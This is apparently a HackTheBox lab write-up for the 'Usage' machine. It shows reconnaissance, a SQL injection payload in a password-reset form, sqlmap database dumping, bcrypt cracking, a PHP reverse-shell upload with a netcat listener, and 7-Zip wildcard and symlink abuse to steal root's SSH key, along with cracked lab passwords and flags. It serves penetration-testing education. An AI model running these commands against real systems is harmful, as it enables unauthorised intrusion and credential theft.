# Usage HTB - Writeup

## Machine Information

- **Name**: Usage
- **Platform**: HackTheBox
- **Difficulty**: Medium
- **Operating System**: Linux
- **IP Address**: 10.129.7.62

## Reconnaissance

### Network Scanning

The initial reconnaissance phase began with a comprehensive Nmap scan to identify open ports and services.

```bash
export target=10.129.7.62
sudo nmap -p- --min-rate 5000 -sT -vvv $target
```

<img width="429" height="46" alt="image" src="https://github.com/user-attachments/assets/c6e04adb-4c80-41ac-8a58-257bff2869bc" />

<img width="712" height="217" alt="image" src="https://github.com/user-attachments/assets/0747e3b3-d32e-4b40-99fd-e7f2e3bb6aac" />

**Scan Results:**
- **Port 22**: SSH
- **Port 80**: HTTP

A follow-up service version detection scan was performed:

```bash
sudo nmap -sC -sV -p 22,80 -T4 $target
```

<img width="760" height="350" alt="image" src="https://github.com/user-attachments/assets/2d06990d-dfa8-4b57-a67e-8837142e8814" />

### Web Application Discovery

The web service running on port 80 revealed a domain-based application. Added the domain to `/etc/hosts`:

```bash
echo "10.129.7.62 usage.htb" | sudo tee -a /etc/hosts
```

<img width="548" height="151" alt="image" src="https://github.com/user-attachments/assets/b78dd2f9-cc35-43b6-a435-b520b1a2cb1b" />

### Subdomain Enumeration

Using FFUF for subdomain enumeration:

```bash
ffuf -c -u 'http://usage.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.usage.htb' -fs 178
```

<img width="966" height="528" alt="image" src="https://github.com/user-attachments/assets/b28d7d71-3872-4c68-9e87-f281531eab64" />

**Discovered Subdomain:**
- `admin.usage.htb`

Added the subdomain to `/etc/hosts`:

```bash
echo "10.129.7.62 admin.usage.htb" | sudo tee -a /etc/hosts
```

### Web Application Analysis

The main application at `http://usage.htb` featured:
- Login functionality
- Registration system
- Admin navigation links

<img width="1350" height="519" alt="image" src="https://github.com/user-attachments/assets/2689110f-527b-4702-8aba-fb8475956a82" />

registering self at http://usage.htb/registration

<img width="957" height="528" alt="image" src="https://github.com/user-attachments/assets/a9355bd9-d81a-458d-9e79-9381a4bb35b9" />

**Note:visiting http://usage.htb/forget-password
password reset form when we enter the correct mail we get “We have e-mailed your password reset link to user@mail.com”**

<img width="957" height="432" alt="image" src="https://github.com/user-attachments/assets/cdb17be2-3457-4819-89fc-3226e50cf871" />


**Note:when we give non existant mail we get "Email address does not match in our records!"**

<img width="957" height="432" alt="image" src="https://github.com/user-attachments/assets/0b75eeb2-f5c9-46c3-aa14-9918cd6de76e" />

## Initial Access

### SQL Injection Discovery

The password reset functionality at `http://usage.htb/forget-password` was vulnerable to SQL injection:

**Vulnerable Parameter:** `email`

**Proof of Concept:**
```sql
' or 1=1;-- -
```

<img width="957" height="432" alt="image" src="https://github.com/user-attachments/assets/969d5617-f274-4454-b9c2-43b72ae46b11" />

### Database Enumeration

Using SQLMap for automated exploitation:

```bash
sqlmap -r forget.req --batch --level 5 --risk 3 -p email --threads 10
```

<img width="962" height="460" alt="image" src="https://github.com/user-attachments/assets/410c1442-31d3-46a8-975b-a4558fe49047" />

forget.req

<img width="461" height="691" alt="image" src="https://github.com/user-attachments/assets/2db78713-ed07-4b04-8266-17c25542225d" />

```bash
sqlmap -r forget.req --batch --level 5 --risk 3 -p email --threads 10 --dbs
```

<img width="962" height="460" alt="image" src="https://github.com/user-attachments/assets/117af846-38b0-485b-934d-8da70e7b1e28" />

**Discovered Databases:**
- `information_schema`
- `performance_schema`
- `usage_blog`

Enumerating tables in the `usage_blog` database:

```bash
sqlmap -r forget.req --batch --level 5 --risk 3 -p email --threads 10 -D usage_blog --tables
```

**Key Tables Identified:**
- `admin_users`
- `users`
- `blog`

Extracting table names:

```bash
sqlmap -r forget.req --batch --level 5 --risk 3 -p email --threads 10 -D usage_blog --tables
```

<img width="891" height="492" alt="image" src="https://github.com/user-attachments/assets/9be984d1-d918-469d-9958-78faa1ffb0d2" />


Extracting administrator credentials:

```bash
sqlmap -r forget.req --batch --level 5 --risk 3 -p email --threads 10 -D usage_blog -T admin_users --dump
```

<img width="961" height="289" alt="image" src="https://github.com/user-attachments/assets/11413698-93d3-47d6-835a-b11ad2e3d2d1" />

**Administrator Credentials:**
- **Username**: `admin`
- **Password Hash**: `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`

### Password Cracking

Using Hashcat to crack the bcrypt hash:

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

**Cracked Password**: `whatever1`

### Admin Panel Access

Successfully logged into the admin panel at `http://admin.usage.htb/` using the credentials:
- **Username**: `admin`
- **Password**: `whatever1`

<img width="948" height="447" alt="image" src="https://github.com/user-attachments/assets/d6332db8-f392-454d-b6f3-0393ebc2a27c" />


**Technology Stack Identified:**
- Laravel Framework v10.18.0

## Exploitation

### Arbitrary File Upload Vulnerability

Laravel v10.18.0 was vulnerable to CVE-2023-24249 (Arbitrary File Upload).

**Exploitation Steps:**

1. **Payload Preparation:**
   - Modified a PHP reverse shell with attacker IP and port

<img width="950" height="466" alt="image" src="https://github.com/user-attachments/assets/4ab3c464-ed1b-4630-ba46-820038af2bb0" />

   - Set up netcat listener: `nc -nlvp 4444`

2. **File Upload Bypass:**
   - Intercepted the upload request using Burp Suite
   - Modified filename from `hello.php.png` to `hello.php`

<img width="941" height="604" alt="image" src="https://github.com/user-attachments/assets/7fd020bf-c142-43ff-8b61-0818e1b2b930" />


3. **Shell Execution:**
   - Accessed the uploaded shell at `http://admin.usage.htb/uploads/images/hello.php`
   - Obtained reverse shell as user `dash`

<img width="855" height="391" alt="image" src="https://github.com/user-attachments/assets/89ac4dc7-f075-4d99-8993-61cd7283ebd0" />

### Stabilizing the Shell

Upgraded to a fully interactive TTY shell for better control.

<img width="629" height="443" alt="image" src="https://github.com/user-attachments/assets/95cf9dcd-abd3-4e00-9a31-0eb44916e120" />

## Privilege Escalation

### User Flag

Located and captured the user flag:

```bash
cat /home/dash/user.txt
```

**User Flag**: `e3113fbd4c794577f05fcb58f98cc3eb`

### Credential Discovery

Discovered Monit configuration file with credentials:

```bash
cat /home/dash/.monitrc
```

**Discovered Credentials:**
- **Username**: `admin`
- **Password**: `3nc0d3d_pa$$w0rd`

## Lateral Movement

### User Enumeration

Identified system users:

```bash
cat /etc/passwd | grep 'sh$'
```

**Users with Shell Access:**
- `root`
- `dash`
- `xander`

### Lateral Movement to Xander

Used discovered credentials to access xander's account:

```bash
su xander
```

**Password**: `3nc0d3d_pa$$w0rd`

<img width="603" height="918" alt="image" src="https://github.com/user-attachments/assets/56663d2b-6d65-45bb-9165-fb48b178de3d" />


### Privilege Escalation Vector

Analyzed sudo privileges for xander:

```bash
sudo -l
```

<img width="757" height="151" alt="image" src="https://github.com/user-attachments/assets/2da02123-de1d-425e-a5b3-3ad6af59b27a" />

**Sudo Privileges:**
- User xander can execute `/usr/bin/usage_management` as root without password

## Root Access

### Binary Analysis

Analyzed the privileged binary:

```bash
strings /usr/bin/usage_management
```

**Binary Functionality:**
- Changes directory to `/var/www/html`
- Executes: `/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *`

### 7-Zip Wildcard Exploitation

Exploited 7-Zip's wildcard handling vulnerability:

**Exploitation Steps:**

1. **Create Symbolic Links:**
   ```bash
   cd /var/www/html
   ln -s /root/.ssh/id_rsa file
   touch @file
   ```

<img width="463" height="135" alt="image" src="https://github.com/user-attachments/assets/6b98cef2-ea99-415b-aa29-04625a29efdb" />

2. **Execute Privileged Binary:**
   ```bash
   sudo /usr/bin/usage_management
   ```
   Selected option 1 (Project Backup)

3. **Extract Root SSH Key:**
   - The backup process followed symbolic links
   - Root's private SSH key was included in the backup

<img width="904" height="713" alt="image" src="https://github.com/user-attachments/assets/2675a01c-e59a-40fb-a659-4b96016a59d3" />

### Root Shell Access

1. **Transfer and Secure SSH Key:**
   ```bash
   chmod 600 root_key
   ```

2. **SSH as Root:**
   ```bash
   ssh -i root_key root@10.129.7.62
   ```

<img width="631" height="497" alt="image" src="https://github.com/user-attachments/assets/640e73f4-bc59-41dd-9006-e4ba24de240a" />

### Root Flag Capture

Located and captured the root flag:

```bash
cat /root/root.txt
```

**Root Flag**: `348556f166e6f970b0db614541475b5f`

## Summary

This penetration test demonstrated a comprehensive attack chain:

1. **Information Gathering**: Network scanning and subdomain enumeration
2. **Vulnerability Discovery**: SQL injection in password reset functionality
3. **Credential Access**: Database enumeration and password cracking
4. **Initial Compromise**: Arbitrary file upload leading to web shell
5. **Lateral Movement**: Credential reuse across user accounts
6. **Privilege Escalation**: Wildcard injection in privileged 7-Zip operations

The attack leveraged multiple security weaknesses including input validation flaws, credential management issues, and improper privilege separation.

## Mitigation Recommendations

1. Implement proper input validation and parameterized queries
2. Enforce strong password policies and implement multi-factor authentication
3. Apply principle of least privilege for service accounts
4. Regularly update frameworks and dependencies
5. Implement proper file upload validation and storage
6. Conduct regular security assessments and penetration testing

---

*This writeup is for educational purposes only. Always ensure you have proper authorization before conducting security testing.*

<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00c8ff; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00c8ff; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00c8ff; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00c8ff; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00c8ff; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00c8ff; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00c8ff; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00c8ff; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00c8ff; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00c8ff; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
